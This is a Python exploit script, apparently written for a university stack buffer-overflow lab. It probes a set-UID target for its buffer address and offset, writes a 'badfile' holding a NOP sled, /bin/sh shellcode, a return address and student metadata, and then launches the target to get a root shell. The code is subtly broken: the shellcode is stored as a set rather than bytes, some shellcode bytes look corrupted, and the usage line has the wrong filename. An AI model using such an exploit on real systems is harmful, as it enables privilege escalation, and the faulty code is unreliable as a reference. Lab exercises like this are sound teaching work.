#!/usr/bin/env python3
"""
exploit.py -- probe addresses from the target's own printouts, 
    then crafts a unique "badfile" (contains email/SID/random note) and launch an attack on the target.

USAGE:
    puthon3 exploitFile.py --email alice@wsu.edu --sid 2025xxxxx --note "my unique note"
    
"""

import os, re, secrets, argparse, hashlib, subprocess

BADFILE_SIZE = 517
START = 20              # shellcode start index inside buffer (< BUF_SIZE delcared in stack-L1.c)
RET_BIAS = 16           # land the RET inside teh NOP sled before shellcode
ADDRESS_LENGTH = 4      # 32-bit address length


# 32-bit Linux /bin/sh shellcode (no null bytes)
SHELLCODE = {
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
    b"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
    b"\xd2\xe1\xc0\xb0\x0b\xcd\x80"
}

def probeAddresses(binpath="./stack-L1"):
    """Run the target with PROBE-1 and parse BUF and OFFSET"""
    env = os.environ.copy()
    env["PROBE"] = "1"
    out = subprocess.check_output([binpath], env=env).decode("utf-8","ignore")
    m = re.search(r"BUF=0x([0-9a-fA-F]+).*OFFSET=(\d+)", out)

    if not m:
        raise RuntimeError("Could not parse BUF/OFFSET from output:\n" + out)
    
    bufferAddress = int(m.group(1), 16)
    offset = int(m.group(2))
    return bufferAddress, offset, out.strip()

def buildUniqueMetaData(email, sid, note):
    rand = secrets.token_hex(8)
    def clean(s): return "".join(ch for ch in s if 32 <= ord(ch) < 127)

    meta = f"EML={clean(email)};SID={clean(sid)};NOTE={clean(note)};RAND = {rand};"
    return meta.encode("ascii", "ignore")

def craftBadFile(buffer_address, offset, email, sid, note, outpath="badfile"):
    content = bytearray([0x90] * BADFILE_SIZE)

    content[START : START + len(SHELLCODE)] = SHELLCODE

    # choose a RET that lands inside teh sled; the sled will slide into the shellcode
    ret = buffer_address + START + RET_BIAS
    content[offset : offset + ADDRESS_LENGTH] = ret.to_bytes(4,"little")

    #append a unique meta trailer so each student's badfile is different
    meta = buildUniqueMetaData(email, sid, note)

    tail_idx = max(offset + ADDRESS_LENGTH + 8, BADFILE_SIZE - len(meta) - 1)

    if tail_idx < BADFILE_SIZE - len(meta):
        content[tail_idx : tail_idx + len(meta)] = meta

    else:
        meta = meta[: max(0, BADFILE_SIZE - tail_idx - 1)]
        content[tail_idx : tail_idx + len(meta)] = meta

    with open(outpath, "wb") as f:
        f.write(content)

    sha256 = hashlib.sha256(content).hexdigest()
    
    return ret, sha256, meta.decode("ascii", "ignore")

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--email", required=True, help="student email")
    ap.add_argument("--sid", required=True, help="Student ID")
    ap.add_argument("--note", required=True, help="short note to personalize")
    ap.add_argument("--bin", default="./stack-L1", help="target binary")
    
    args = ap.parse_args()

    bufferAddress, offset, raw = probeAddresses(args.bin)
    print("\n[+] PROBE:", raw)
    print(f"\n[+] PARSED BUF=0x{bufferAddress:08x}, OFFSET = {offset}")

    ret, sha256, meta = craftBadFile(bufferAddress, offset, args.email, args.sid, args.note)

    print(f"\n[+] RET=0x{ret:08x}")
    print(f"\n[+] badfile SHA = {sha256}")
    print(f"\n[+] META = {meta}")

    print("\n[--] LAUNCHING TARGET (should spawn a root shel if set-UID)")

    os.execv(args.bin, [args.bin])

if __name__ == "__main__":
    main()
    
    